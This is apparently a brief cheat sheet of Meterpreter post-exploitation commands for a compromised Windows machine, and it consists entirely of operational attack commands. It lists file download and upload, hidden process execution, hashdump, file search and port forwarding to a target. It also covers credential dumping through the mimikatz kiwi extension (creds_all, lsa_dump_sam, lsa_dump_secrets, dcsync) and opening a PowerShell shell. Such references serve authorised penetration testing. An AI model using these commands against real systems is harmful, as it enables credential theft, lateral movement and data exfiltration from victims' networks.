% meterpreter

# download
download <PATH_TO>\\<FILE>

#upload
upload <FILE> <PATH_TO>\\<FILE>

# edit
edit <FILE>

# execute [-H hide process] [-f file]
execute -H -f notepad.exe

# hashdump
hashdump

# search
search -f <FILE>*.<EXTENSION> <PATH_TO>\\

# port forward
portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r  <TARGET_IP>
curl http://127.0.0.1:<LOCAL_PORT>

# mimikatz
load kiwi
help kiwi
creds_all lsa_dump_sam lsa_dump_secrets dcsync

# powershell
load powershell
help powershell
powershell_shell
